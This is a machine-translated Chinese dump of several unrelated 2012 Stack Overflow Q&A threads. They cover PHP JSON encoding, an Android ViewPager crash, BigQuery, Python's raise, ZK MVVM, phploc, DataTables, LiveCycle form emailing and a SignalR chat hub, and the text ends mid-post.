$json = json_encode($data, JSON_NUMERIC_CHECK); 
```

对于我的应用程序，除了一种情况外，这在所有情况下都可以正常工作。在 php 数组（从数据库中提取）中，有一个字段包含非常大的整数。我将它作为 VARCHAR 保存到数据库，但不幸的是，当编码为 json 时，它被转换为整数。问题是，由于这是一个非常大的整数，它会被四舍五入，因此不代表真实值。我该如何解决这个问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-19T17:31:43.213

您是否希望将大数转换为整数？你的问题让我相信你没有。如果是这种情况，请从调用中删除 JSON_NUMERIC_CHECK 选项，它不应更改字段的编码。

关于这个（和其他）常量的文档在[这里](http://php.net/manual/en/json.constants.php)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-12-13T12:19:10.273

也许为时已晚，但我确实遇到了同样的问题，并且由于必须使用该版本运行的遗留代码而停留在服务器上的 PHP 5.3 上。我使用的解决方案是愚蠢的，但确实对我有用：简单地在从数据库读取的 varchar 长整数的末尾添加一个空格字符，然后将其发送到使用 JSON_NUMERIC_CHECK 的 json 编码。

# android - IllegalStateException - ViewPager 中的 removeView()

> ID：13957806
> 
> 赞同：2
> 
> 时间：2012-12-19T17:26:06.130
> 
> 标签：android, android-viewpager, removechild

我正在尝试使用 ViewPager 处理我的 Fragment，但出现此错误：

**日志猫：**

```
12-19 14:16:25.180: I/mFragment(5866): onCreate() LogicAnalizerActivity
12-19 14:16:25.235: I/mFragment(5866): FragmentAdapter Constructor
12-19 14:16:25.235: I/mFragment(5866): onResume() LogicAnalizerActivity
12-19 14:16:25.310: I/mFragment(5866): Page item 0
12-19 14:16:25.320: I/onCreate()(5866): onCreate LogicAnalizerView
12-19 14:16:25.350: D/AndroidRuntime(5866): Shutting down VM
12-19 14:16:25.355: W/dalvikvm(5866): threadid=1: thread exiting with uncaught exception (group=0x40d77300)
12-19 14:16:25.690: E/AndroidRuntime(5866): FATAL EXCEPTION: main
12-19 14:16:25.690: E/AndroidRuntime(5866): java.lang.IllegalStateException: The specified child already has a parent. You must call removeView() on the child's parent first.
12-19 14:16:25.690: E/AndroidRuntime(5866):     at android.view.ViewGroup.addViewInner(ViewGroup.java:3378)
12-19 14:16:25.690: E/AndroidRuntime(5866):     at android.view.ViewGroup.addView(ViewGroup.java:3249)
12-19 14:16:25.690: E/AndroidRuntime(5866):     at android.view.ViewGroup.addView(ViewGroup.java:3194)
12-19 14:16:25.690: E/AndroidRuntime(5866):     at android.view.ViewGroup.addView(ViewGroup.java:3170)
12-19 14:16:25.690: E/AndroidRuntime(5866):     at android.support.v4.app.NoSaveStateFrameLayout.wrap(NoSaveStateFrameLayout.java:40)
12-19 14:16:25.690: E/AndroidRuntime(5866):     at android.support.v4.app.FragmentManagerImpl.moveToState(FragmentManager.java:874)
12-19 14:16:25.690: E/AndroidRuntime(5866):     at android.support.v4.app.FragmentManagerImpl.moveToState(FragmentManager.java:1080)
12-19 14:16:25.690: E/AndroidRuntime(5866):     at android.support.v4.app.BackStackRecord.run(BackStackRecord.java:622)
12-19 14:16:25.690: E/AndroidRuntime(5866):     at android.support.v4.app.FragmentManagerImpl.execPendingActions(FragmentManager.java:1416)
12-19 14:16:25.690: E/AndroidRuntime(5866):     at android.support.v4.app.FragmentManagerImpl.executePendingTransactions(FragmentManager.java:431)
12-19 14:16:25.690: E/AndroidRuntime(5866):     at android.support.v4.app.FragmentPagerAdapter.finishUpdate(FragmentPagerAdapter.java:139)
12-19 14:16:25.690: E/AndroidRuntime(5866):     at android.support.v4.view.ViewPager.populate(ViewPager.java:804)
12-19 14:16:25.690: E/AndroidRuntime(5866):     at android.support.v4.view.ViewPager.onMeasure(ViewPager.java:1016)
12-19 14:16:25.690: E/AndroidRuntime(5866):     at android.view.View.measure(View.java:15172)
12-19 14:16:25.690: E/AndroidRuntime(5866):     at android.view.ViewGroup.measureChildWithMargins(ViewGroup.java:4816)
12-19 14:16:25.690: E/AndroidRuntime(5866):     at android.widget.LinearLayout.measureChildBeforeLayout(LinearLayout.java:1390)
12-19 14:16:25.690: E/AndroidRuntime(5866):     at android.widget.LinearLayout.measureVertical(LinearLayout.java:681)
12-19 14:16:25.690: E/AndroidRuntime(5866):     at android.widget.LinearLayout.onMeasure(LinearLayout.java:574)
12-19 14:16:25.690: E/AndroidRuntime(5866):     at android.view.View.measure(View.java:15172)
12-19 14:16:25.690: E/AndroidRuntime(5866):     at android.view.ViewGroup.measureChildWithMargins(ViewGroup.java:4816)
12-19 14:16:25.690: E/AndroidRuntime(5866):     at android.widget.FrameLayout.onMeasure(FrameLayout.java:310)
12-19 14:16:25.690: E/AndroidRuntime(5866):     at android.view.View.measure(View.java:15172)
12-19 14:16:25.690: E/AndroidRuntime(5866):     at android.widget.LinearLayout.measureVertical(LinearLayout.java:833)
12-19 14:16:25.690: E/AndroidRuntime(5866):     at android.widget.LinearLayout.onMeasure(LinearLayout.java:574)
12-19 14:16:25.690: E/AndroidRuntime(5866):     at android.view.View.measure(View.java:15172)
12-19 14:16:25.690: E/AndroidRuntime(5866):     at android.view.ViewGroup.measureChildWithMargins(ViewGroup.java:4816)
12-19 14:16:25.690: E/AndroidRuntime(5866):     at android.widget.FrameLayout.onMeasure(FrameLayout.java:310)
12-19 14:16:25.690: E/AndroidRuntime(5866):     at com.android.internal.policy.impl.PhoneWindow$DecorView.onMeasure(PhoneWindow.java:2432)
12-19 14:16:25.690: E/AndroidRuntime(5866):     at android.view.View.measure(View.java:15172)
12-19 14:16:25.690: E/AndroidRuntime(5866):     at android.view.ViewRootImpl.performMeasure(ViewRootImpl.java:1850)
12-19 14:16:25.690: E/AndroidRuntime(5866):     at android.view.ViewRootImpl.measureHierarchy(ViewRootImpl.java:1102)
12-19 14:16:25.690: E/AndroidRuntime(5866):     at android.view.ViewRootImpl.performTraversals(ViewRootImpl.java:1275)
12-19 14:16:25.690: E/AndroidRuntime(5866):     at android.view.ViewRootImpl.doTraversal(ViewRootImpl.java:1000)
12-19 14:16:25.690: E/AndroidRuntime(5866):     at android.view.ViewRootImpl$TraversalRunnable.run(ViewRootImpl.java:4214)
12-19 14:16:25.690: E/AndroidRuntime(5866):     at android.view.Choreographer$CallbackRecord.run(Choreographer.java:725)
12-19 14:16:25.690: E/AndroidRuntime(5866):     at android.view.Choreographer.doCallbacks(Choreographer.java:555)
12-19 14:16:25.690: E/AndroidRuntime(5866):     at android.view.Choreographer.doFrame(Choreographer.java:525)
12-19 14:16:25.690: E/AndroidRuntime(5866):     at android.view.Choreographer$FrameDisplayEventReceiver.run(Choreographer.java:711)
12-19 14:16:25.690: E/AndroidRuntime(5866):     at android.os.Handler.handleCallback(Handler.java:615)
12-19 14:16:25.690: E/AndroidRuntime(5866):     at android.os.Handler.dispatchMessage(Handler.java:92)
12-19 14:16:25.690: E/AndroidRuntime(5866):     at android.os.Looper.loop(Looper.java:137)
12-19 14:16:25.690: E/AndroidRuntime(5866):     at android.app.ActivityThread.main(ActivityThread.java:4978)
12-19 14:16:25.690: E/AndroidRuntime(5866):     at java.lang.reflect.Method.invokeNative(Native Method)
12-19 14:16:25.690: E/AndroidRuntime(5866):     at java.lang.reflect.Method.invoke(Method.java:511)
12-19 14:16:25.690: E/AndroidRuntime(5866):     at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:791)
12-19 14:16:25.690: E/AndroidRuntime(5866):     at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:558)
12-19 14:16:25.690: E/AndroidRuntime(5866):     at dalvik.system.NativeStart.main(Native Method) 
```

* * *

**活动片段：**

```
import android.os.Bundle;
import android.support.v4.app.Fragment;
import android.support.v4.app.FragmentManager;
import android.support.v4.app.FragmentPagerAdapter;
import android.support.v4.view.ViewPager;
import android.util.Log;
import android.view.View;
import android.widget.LinearLayout;

import com.actionbarsherlock.app.ActionBar;
import com.actionbarsherlock.app.SherlockFragmentActivity;
import com.actionbarsherlock.view.Menu;
import com.actionbarsherlock.view.MenuInflater;

public class LogicAnalizerActivity extends SherlockFragmentActivity {

    private static final boolean DEBUG = true;
    /** Numero de paginas del ViewPager */
    private static final int pageCount = 1;

    private static ActionBar actionBar;
    private static ViewPager mViewPager;
    private static MyFragmentAdapter mAdapter;

    @Override
    protected void onCreate(Bundle arg0) {
        super.onCreate(arg0);
        if(DEBUG) Log.i("mFragment","onCreate() LogicAnalizerActivity");

        actionBar = getSupportActionBar();
        setContentView(R.layout.fragment);

        mAdapter = new MyFragmentAdapter(getSupportFragmentManager());
        mViewPager = (ViewPager) findViewById(R.id.pagerLogicAnalizer);
        mViewPager.setAdapter(mAdapter);

        mViewPager.setCurrentItem(0);
        mViewPager.setOffscreenPageLimit(1);

    }

    @Override
    protected void onResume() {
        if(DEBUG) Log.i("mFragment","onResume() LogicAnalizerActivity");
        super.onResume();
    }

    /**
     * Crea el ActionBar desde el XML actionbarlogic que define los iconos en el mismo
     */
    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        if(DEBUG) Log.i("onCreateOptionsMenu()", "onCreateOptionsMenu() -> LogicAnalizerView");
        MenuInflater inflater = getSupportMenuInflater();
        inflater.inflate(R.menu.actionbarlogic, menu);
        return true;
    }

    public static class MyFragmentAdapter extends FragmentPagerAdapter{

        public MyFragmentAdapter(FragmentManager fm) {
            super(fm);
            if(DEBUG) Log.i("mFragment","FragmentAdapter Constructor");
        }

        @Override
        public Fragment getItem(int arg0) {
            if(DEBUG) Log.i("mFragment","Page item " + arg0);
            switch(arg0){
                case 0:
                    return new LogicAnalizerFragment();
                case 1:
                    return new LogicAnalizerFragment();
            }
            return new LogicAnalizerFragment();
        }

        @Override
        public int getCount() {
            return pageCount;
        }

        @Override
        public void destroyItem(View collection, int position, Object view) {
            if(DEBUG) Log.i("mFragment","Destroy item " + position);
            ((ViewPager) collection).removeView((LinearLayout) view);
        }

    }
} 
```

* * *

**LogicAnalizerFragment：** 太长了，可以看[这里](https://github.com/dragondgold/MultiWork/blob/master/src/com/multiwork/andres/LogicAnalizerFragment.java "这里")

* * *

**片段.xml：**

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="vertical" >

    <android.support.v4.view.ViewPager
        android:id="@+id/pagerLogicAnalizer"
        android:layout_width="match_parent"
        android:layout_height="match_parent" />

</LinearLayout> 
```

Fragment 工作正常，但是当我尝试将它与 ViewPager 一起使用时，我收到了这个错误，我搜索了很多 ViewPager 示例，并且都是相同的。我已经添加了：

```
 @Override
            public void destroyItem(View collection, int position, Object view) {
                if(DEBUG) Log.i("mFragment","Destroy item " + position);
                ((ViewPager) collection).removeView((LinearLayout) view);
            } 
```

试图解决问题，但它仍然存在。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-19T17:39:24.417

250 号线，

```
return inflater.inflate(R.layout.logicanalizer, container); 
```

添加假；

```
 return inflater.inflate(R.layout.logicanalizer, container,false); 
```

第三个参数决定天气是否应该附加到“容器”，文件：

> @3rd param attachToRoot 膨胀的层次结构是否应该附加到根参数？如果为 false，则 root 仅用于为 XML 中的根视图创建正确的 LayoutParams 子类。
> 
> @return 膨胀层次结构的根视图。如果提供了 root 并且 attachToRoot 为真，则这是 root；否则它是膨胀的 XML 文件的根。

# google-app-engine - BigQuery 请求中的执行调用在哪里？

> ID：13957809
> 
> 赞同：1
> 
> 时间：2012-12-19T17:26:16.480
> 
> 标签：google-app-engine, google-bigquery

我正在关注这里的代码实验室[https://developers.google.com/bigquery/articles/gettingstartedwithjava](https://developers.google.com/bigquery/articles/gettingstartedwithjava)来请求大查询。这里的代码示例之一说：

```
Datasets.List datasetRequest = bigquery.datasets().list(projectId);
DatasetList datasetList = datasetRequest.execute(); 
```

但我收到“Bigquery.Datasets.List 类型的方法 execute() 未定义”错误。

知道发生了什么吗？如果这很重要，我正在使用 google-api-services-bigquery-v2-rev42-1.12.0-beta 版本。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-19T17:56:23.787

您需要显式添加此依赖项才能使其正常工作。google-api-services-bigquery 在 pom 中的依赖似乎是错误的。这导致了这个异常。

```
 <dependency>
        <groupId>com.google.api-client</groupId>
        <artifactId>google-api-client</artifactId>
        <version>1.12.0-beta</version>
    </dependency> 
```

# c# - 在后面的代码中使用标签导航

> ID：13957818
> 
> 赞同：1
> 
> 时间：2012-12-19T17:26:52.553
> 
> 标签：c#, asp.net, html, navigation

我目前正在使用`<a>`标签来单击和导航，如下面的代码中所述。我想根据选定的 id 在 page_prerender 事件中的 c# 标签中导航下面的代码。有人可以帮忙吗？

```
<li><a href="#" rel="cat1">Category 1</a></li>
    <li><a href="#" rel="cat2">Category 2</a></li>
    <div id="cat1">
    Content goes here
    </div>
    <div id="cat2">
    Content goes here
    </div> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-19T17:32:49.890

如果 url 不包含 '#' 那么

```
Response.Redirect("www.yoururl.com/Default.aspx#Cat2"); 
```

那是你要找的吗？

点击`<a>`in html 与添加到 URL 的末尾实际上是一样`#Cat2`的，浏览器知道从那里做什么

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-19T17:35:33.007

我相信您需要一个 url 重写层来了解它的方式。这些`<a>`链接只是一个`GET`没有进一步信息的请求。即使那样，您也需要链接为`href="cat1"`或`href="#cat1"`。

最简单的替代方法是使用`<asp:linkbutton />`可以具有服务器端 onclick 事件的方法。

您还可以查看 AJAX 请求，或者使用 javascript 隐藏和显示这些部分，如果内容是基于请求的动态的 AJAX 将在那里需要。

# java - 借助java在axis2中创建soapmonitor小程序？

> ID：13957823
> 
> 赞同：0
> 
> 时间：2012-12-19T17:27:13.470
> 
> 标签：java, xml, soap, axis2, monitor

谁能回答我如何使用java在axis2 Web服务器和tomcat容器中制作我自己的soapmonitor小程序？

非常感谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-19T19:58:36.947

您是否尝试过遵循 Axis2 文档？看起来很全面：

*   [http://axis.apache.org/axis2/java/core/docs/soapmonitor-module.html](http://axis.apache.org/axis2/java/core/docs/soapmonitor-module.html)

# python - 如何在 Python 中使用“raise”关键字

> ID：13957829
> 
> 赞同：309
> 
> 时间：2012-12-19T17:27:28.547
> 
> 标签：python, keyword, raise

我已经阅读了“raise”的官方定义，但我仍然不太明白它的作用。

简单来说，什么是“加薪”？

示例用法会有所帮助。

* * *

## 回答 #1

> 赞同：377
> 
> 时间：2012-12-19T17:32:03.200

它有两个目的。

[jackcogdill 给出了第一个。](https://stackoverflow.com/a/13957849/20862)

> 它用于引发您自己的错误。

> ```
> if something: 
> ```

```
 raise Exception('My error!') 
```

第二个是在异常处理程序中重新引发*当前*异常，以便可以在调用堆栈中进一步处理它。

```
try:
  generate_exception()
except SomeException as e:
  if not can_handle(e):
    raise
  handle_exception(e) 
```

* * *

## 回答 #2

> 赞同：50
> 
> 时间：2015-01-14T16:21:12.063

`raise`不带任何参数是 python 语法的一种特殊用法。这意味着获取异常并重新引发它。如果这种用法可以称为**`reraise`**.

```
 raise 
```

来自[Python 语言参考](https://docs.python.org/2/reference/simple_stmts.html?highlight=raise#grammar-token-raise_stmt)：

> 如果不存在表达式， raise 会重新引发在当前范围内活动的最后一个异常。

如果`raise`单独使用没有任何参数，则严格用于**reraise** -ing。如果在未重新引发另一个异常的情况下完成，则会显示以下错误： `RuntimeError: No active exception to reraise`

* * *

## 回答 #3

> 赞同：49
> 
> 时间：2012-12-19T17:28:28.097

它用于引发错误。

```
if something:
    raise Exception('My error!') 
```

[这里](http://infohost.nmt.edu/tcc/help/pubs/python/web/raise-statement.html)有一些例子

* * *

## 回答 #4

> 赞同：22
> 
> 时间：2017-05-04T08:11:41.393

此外`raise Exception("message")`，`raise`Python 3 引入了一种新形式，`raise Exception("message") from e`. 它称为异常链接，它允许您保留原始异常（根本原因）及其回溯。

它与 C# 的内部异常非常相似。

更多信息： [https ://www.python.org/dev/peps/pep-3134/](https://www.python.org/dev/peps/pep-3134/)

* * *

## 回答 #5

> 赞同：17
> 
> 时间：2012-12-19T17:32:47.650

作为错误检查的一部分，您可以使用它来引发错误：

```
if (a < b):
    raise ValueError() 
```

或者处理一些错误，然后将它们作为错误处理的一部分传递：

```
try:
    f = open('file.txt', 'r')
except IOError:
    # do some processing here
    # and then pass the error on
    raise 
```

* * *

## 回答 #6

> 赞同：12
> 
> 时间：2012-12-19T17:30:15.363

`raise`导致引发异常。其他一些语言使用动词“投掷”。

它旨在指示错误情况；它标志着这种情况对于正常流程来说是异常的。

引发的异常可以被代码“上游”（周围的块，或堆栈上较早的函数）再次捕获，以使用`try`,`except`组合来处理它。

# data-binding - zkoss MVVM 更改为模型强制网格重新加载

> ID：13957832
> 
> 赞同：5
> 
> 时间：2012-12-19T17:27:34.037
> 
> 标签：data-binding, mvvm, grid, zk

我正在使用 ZKOSS MVVM。所以在视图中我使用了一个列表框，它被绑定（@load）到 ViewModel 中的一个列表模型对象。

如果我更改模型，我从文档中了解的内容

1：从索引 0 处的视图模型中添加一个对象到列表模型

```
I should see the latest object be appended at top of the Listbox. 
```

2：从模型中删除一个项目

```
I should see that particular row from Listbox be removed. 
```

*注意：当有人创建帖子并将新帖子附加到帖子列表时，这是一个类似于社交网络的界面，例如 Facebook 墙。如果删除帖子，则仅从列表中删除该帖子*

好吧，它确实发生了（新项目被附加/删除的项目被删除）但整个列表框重新加载，而不仅仅是添加或删除的特定行。

这是为什么？为什么 Listbox 在列表模型更改时完全重新加载。

任何的想法？

以下是代码片段（用例：添加新帖子适用。在创建新帖子时，每次都会重新加载整个列表框）：

**看法**

```
<z:div style="height: 100%; padding: 0px; margin: 0px;" apply="org.zkoss.bind.BindComposer"
    viewModel="@id('want_vm') @init('want.WantDesktopVM')">
<z:div zclass="content">
    <g:render template="../css/list/noEffectList"></g:render>
    <z:div hflex="1" width="100%" visible="@load(want_vm.toggleInput)" style="margin-bottom: 5px; padding: 5px">
        <z:vbox>
            <z:textbox id="postInput" multiline="true" value="" width="690px" height="50px"/>
            <z:div hflex="1" width="100%" style="text-align: right; padding-right: 5px">
                <z:button label="Post" zclass="button rect theme" onClick="@command('post', text=postInput.value)"/>
            </z:div>
        </z:vbox>           
    </z:div>
    <z:listbox model="@load(want_vm.posts)" emptyMessage="No new posts found." style="border:none;">
        <z:template name="model" var="iwant">
            <listitem style="margin-top: 10px"> 
                <listcell>
                    <hbox hflex="true">
                        <div zclass="dpFrame small">
                            <image height="50px" width="50px" content="@load(iwant.from) @converter('converter.UserActorDisplayPicConverter')" />
                        </div>
                        <vbox hflex="true" zclass="post"> 
                            <hbox hflex="true">
                                <label value="@load(iwant.from) @converter('converter.ActorDisplayNameConverter')" zclass="displayName"/>
                            </hbox>
                            <hbox hflex="true">
                                <label value="@load(iwant.textData)" zclass="post_data" multiline="true" maxlength="25"/>
                            </hbox>
                            <hbox>
                                <label value="@load(iwant.dateCreated) @converter('converter.SinceDateConverter')" zclass="since"/>
                            </hbox>
                        </vbox>
                    </hbox>
                </listcell> 
            </listitem>
        </z:template>
    </z:listbox>
</z:div> 
```

**视图模型**

```
class WantDesktopVM {
UserActorManagerService userActorManagerService
ActivityManagerService activityManagerService

UserActor me
UserActor profile

String error = null
String view = 'iwant'

@Wire
Textbox postInput

private List<Activity> posts = []

@Init
public void init(@ContextParam(ContextType.COMPONENT) Component component,
@ContextParam(ContextType.VIEW) Component view) {
    profile = Executions.current.getAttribute("profile")
    me = Executions.current.getAttribute("me")
    loadPosts()
}

@AfterCompose
public void afterCompose(@ContextParam(ContextType.VIEW) Component view) {
    Selectors.wireComponents(view, this, false);
}

public boolean isMyProfile() {
    return me.id == profile.id
} 

public UserActor getMe() {
    return this.me
}

public boolean isToggleInput() {
    return this.view == 'iwant' && isMyProfile()
}

public List<Activity> getPosts() {
    println "Getting posts ...${posts.size()}"
    return this.posts
}

private List<Activity> loadPosts() {
    if(view == 'iwant') {
        posts = Activity.createCriteria().list() {
            eq 'from', profile
            eq 'type', ACTIVITY_TYPE.WANT
            order("lastUpdated", "desc")
        }
    } else {
        posts = ActorActivitySpace.createCriteria().list() {
            projections {property("activity")}
            eq 'actor', profile
            activity {
                ne 'from', profile
                eq 'type', ACTIVITY_TYPE.WANT
            }
            order("lastUpdated", "desc")
        }
    }
    return posts
}

@NotifyChange(['posts', 'toggleInput'])
@Command
public void render(@BindingParam('view') String view) {
    println "Changing view ..."
    this.view = view
    loadPosts()
}

@NotifyChange('posts')
@Command
public void post(@BindingParam('text') String text) {
    println "Posting text: $text"
    postInput.setValue("")
    if(text) {
        Activity want = activityManagerService.want(me.id, text)
        println"Want ID : $want.id"
        posts.addAll(0, [want])
    }
} 
```

}

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-20T08:47:36.087

你`@NotifyChange('posts')`用来告诉 ZK 整个列表已经改变。网格不会尝试检查列表，它只是将其当前替换`ListModel`为新列表 -> 完全重新加载。

如果你不想这样，你将不得不使用`ListModel`网格使用的方法来更新 ui。这样，网格将准确地知道哪些行发生了变化，并且只更新那些行。

**[编辑]**要实现您想要的，请替换`List<Activity> posts`为`ListModelList<Activity> posts = new ListModelList<Activity>()`

当活动发生变化时，您必须*更新*此列表（即调用`add()`或`addAll()`）以更新各个行。您不能再从数据库中加载所有内容，您必须将数据库中的更改与现有列表*合并。*

# php - 为什么phploc忽略ant中的排除

> ID：13957833
> 
> 赞同：1
> 
> 时间：2012-12-19T17:27:34.580
> 
> 标签：php, ant, phploc

在我的构建文件中，我使用 jenkins-php.org 中描述的[phploc](http://jenkins-php.org)，但它不会忽略文件夹。

```
<target name="phploc" description="Measure project size using PHPLOC">
    <exec executable="phploc">
        <arg value="--log-csv" />
        <arg value="${basedir}/build/logs/phploc.csv" />
        <arg value="--exclude"/>
        <arg value="${basedir}/include/library" />
        <arg path="${basedir}"/>
    </exec>
</target> 
```

它在项目目录中的控制台上使用此命令：

```
phploc --log-csv build/logs/phploc.csv --exclude include/library . 
```

但为什么不在我的构建文件中？它始终贯穿 library 下的整个 Zend 库。

哦，phpcpd 是同样的问题。在控制台中是对的，用 ant 运行它不是...

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-20T11:57:55.957

我在这里猜，但在你的命令行运行中你使用

```
--exclude include/library 
```

而在 Ant 构建文件中，您拥有

```
<arg value="--exclude"/>
<arg value="${basedir}/include/library" /> 
```

这实际上是

```
--exclude ${basedir}/include/library 
```

`basedir`设置为您拥有的任何东西。

也许尝试

```
<arg value="--exclude"/>
<arg value="include/library" /> 
```

反而。

# jquery - 使用 DataTable 或 jQuery 禁用对空列的排序

> ID：13957839
> 
> 赞同：2
> 
> 时间：2012-12-19T17:28:03.397
> 
> 标签：jquery, sorting, datatable

我需要对其中没有数据的所有列禁用排序。我希望使用 DataTable 或 jQuery 来实现。如果我有多个表，我应该能够遍历所有表并为每一列返回 true 或 false。这样我就可以获取结果并禁用列排序。这是我到目前为止所拥有的，尽管代码不完整。

```
function detectEmptyColumn(index) {

var sStatus = [], status ='';
var colors = ['red','green','blue','yellow','purple','black','cyan','green'];

$('.data-table').eq(index).find('tbody').each(function(i) {
    var self = this;
    $(self).find('tr td').each(function(j) {
        if (j > 0) {
            $(self).find('tr').each(function(k) {
                var $tableCell  = $(this).find('td:visible').eq(j);

                $tableCell.css('border','2px solid '+colors[j]);
                var $innerWrapper = $('.inner-wrapper', $tableCell);
                status = ('a', $innerWrapper).size() > 0;
                sStatus[k] = status;
                if (status) return false;
            });
        }
    });
});

return status;

}

function disableEmptyColumnSorting() {

$('.data-table').each(function(index) {
    var status = detectEmptyColumn(index);
});

} 
```

这就是 Datatable td 的样子：

```
<td class="reading-level interpTRC_no_interp
    firstCol
     "><div class="inner-wrapper" style="position: relative;">
        <span title="-5" class="sortindex"></span>

        <a href="/test/test123">

            &lt;PC

                <sup>F</sup>
        </a>
</div></td> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-19T17:36:58.700

检测空列比 atm 更容易：

```
function isColumnEmpty(index)
{
    return $("tbody td").filter(function(){
        return $(this).index() == index && $.trim($(this).text()).length;
    }).length == 0;        
} 
```

上面的函数使用 TD 上的过滤器，然后检测索引并将其与传递的列的索引进行比较，并检查文本内容是否大于 0。由于过滤掉了所有 HTML 标签，因此您将只有文本。

你用的是什么插件，所以我可以看看如何禁用排序？

# sitemap - 检查从网站地图 asp.net 导航的节点用户

> ID：13957843
> 
> 赞同：1
> 
> 时间：2012-12-19T17:28:12.260
> 
> 标签：sitemap

这是场景。

我有一个 Website.Map，其中包含以下节点。

```
<siteMapNode title="Self" url="" description="" roles="STF,FAC">
<siteMapNode title="My Schedule" url="" description="~/schedule.aspx" />
<siteMapNode title="My Report" url="" description="~/report.aspx" />
</siteMapNode>

<siteMapNode title="Supervisor" url="" roles="SUP">
<siteMapNode title=" Manage Schedule" url="" description="~/schedule.aspx" />
<siteMapNode title="Send Notification" url="" description="~/notification.aspx" />
</siteMapNode> 
```

在我的网站中，我有一个名为 schedule.aspx 的 aspx 页面，我将使用它来列出日程安排。我可以从

a) 自我-> 网站地图菜单中的我的日程安排或 b) 主管-> 管理网站地图菜单中的日程安排。

1) 当我从 Self - > My Schedule 导航到日程安排页面时，日程安排页面必须显示我的（用户的）日程安排

或者

2) 当我从 Supervisor -> Manage Schedule 导航到日程安排页面时，日程安排页面必须显示我所有的下属（用户监督的人员）日程安排。

因此，在 schedule.aspx 的页面加载事件中，我想检查用户来自 Self 还是 Supervisor 的来源。

有什么办法可以做到这一点？

# javascript - 使用 livecycle 设计器表单上的通用按钮通过电子邮件发送 xml 文件？

> ID：13957844
> 
> 赞同：1
> 
> 时间：2012-12-19T17:28:14.747
> 
> 标签：javascript, livecycle

我在另一个线程 (13056369) 上找到了以下脚本：

```
// Replace with actual path to the field which contains the subject:
var subject = form1.SF1.TxtFld1.rawValue.concat("_"+ form1.SF1.TxtFld2.rawValue);

var myDoc = event.target;
try {
    myDoc.mailDoc({
        bUI: false,
        cTo: 'me@email.org', // Replace with actual receiver mail address.
        cSubject: subject,
        cSubmitAs: "PDF"
    });
} catch (e) {
    // exception handling...
} 
```

上面的效果很好。但是，我想将其修改为通过电子邮件发送 xml 文件而不是 pdf 文件。任何有关如何修改上述脚本的帮助将不胜感激。

如果您有其他方法可以完成相同的任务，请告诉我，我会试一试。我只需要主题行使用上面脚本中标识的两个文本字段，并且文件需要是 xml 而不是 pdf。

我正在使用 LiveCycle Designer 9。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T20:36:42.153

```
var cSubLine = "Subject line"; 
var cBody = "Body of the email";
var cEmailURL = "mailto:theEmailYouWant@gmail.com?cc=" + "&subject=" + cSubLine + "&body=" + cBody;

event.target.submitForm({
    cURL: cEmailURL,
    cSubmitAs:"XML",
    cCharSet:"utf-8"
    }); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-15T23:45:02.993

您可以使用电子邮件提交按钮而不是自定义代码来处理提交数据类型、电子邮件地址和主题等参数。这是一种首选方法，而不是在 LiveCycle ES 中添加自定义代码。

我确实包含了电子邮件地址按钮的图像，但由于我是 Stack Overflow 的 n00b，因此无法发布它。如果您有任何其他问题，请告诉我。

# c# - Microsoft.AspNet.SignalR：获取未捕获的类型错误：对象# has no method 'Logon' I am new in SignalR and I am trying to develop simple chat application using signalR with ASP.NET MVC 3\. I have done following coding with 问问题

> ID：13957850
> 
> 赞同：3
> 
> 时间：2012-12-19T17:28:27.653
> 
> 标签：c#, asp.net-mvc-3, signalr

I am new in SignalR and I am trying to develop simple chat application using signalR with ASP.NET MVC 3\. I have done following coding with [Tutorial: Getting Started with SignalR (C#)](http://www.asp.net/signalr/overview/getting-started/tutorial-getting-started-with-signalr) reference.

**ChatHub**

```
public class ChatHub : Hub
{
    private static readonly Dictionary<string, ChatUser> _users 
        = new Dictionary<string, ChatUser>(StringComparer.OrdinalIgnoreCase);

    public Task Send(string message)
    {
        var user = _users.Values.FirstOrDefault(u => u.ClientId == Context.ConnectionId);

        if (user == null)
        {
            throw new Exception("User is not logged in");
        }

         return Clients.All.message(user.Name, message, TimeStamp());
    }

    public void Logon(string clientName)
    {
        if (clientName.Length > 10)
        {
            throw new Exception("I prefer short names.");
        }

        if (_users.Any(x => x.Key == clientName))
        {
            throw new Exception("User name is already taken, please select a different one.");
        }

        _users.Add(clientName, new ChatUser { ClientId = Context.ConnectionId, Name = clientName });

        Clients.Caller.name = clientName;

        Clients.All.loggedOn(clientName, TimeStamp());
    }

    public Task Logout()
    {
        var user = _users.Values.FirstOrDefault(u => u.ClientId == Context.ConnectionId);

        if (user != null)
        {
            _users.Remove(user.Name);
           return  Clients.All.loggedOff(user.Name, TimeStamp());
        }

        return null;
    }

    public IEnumerable<ChatUser> GetUsers()
    {
        return _users.Values.OrderBy(x => x.Name);
    }

    private static string TimeStamp()
    {
        return DateTime.Now.ToShortTimeString();
    }
} 
```

**ChatUser Class**

```
public class ChatUser
{
    public string ClientId { get; set; }
    public string Name { get; set; }
} 
```

**IndexView.chtml**

SignalR Chat

```
 <div id="info" class="round">
            <h1>
                SignalR Chat</h1>
            <form id="startform">
             Enter your name:
            <input type="text" id="name" />
            <input type="button" id="btn_login" class="button" style="margin-top: 25px;" value="Start chatting" />
            </form>
            <div id="login_error" style="margin-top: 100px;" class="error">
            </div>
        </div>

        <div id="chat">
            <div style="height: 50px;">
                <div>SignalRChat</div>
                <div id="logout">
                    <a href="" id="btn_logout">Logout</a>
                </div>
            </div>
            <div class="users-box right round2">
                <strong>Users in chat:</strong>
                <ul id="users">
                </ul>
            </div>
            <div class="chat-box round2">
                <div id="messages">
                    <ul id="message-list">
                    </ul>
                </div>
                <form id="chatform">
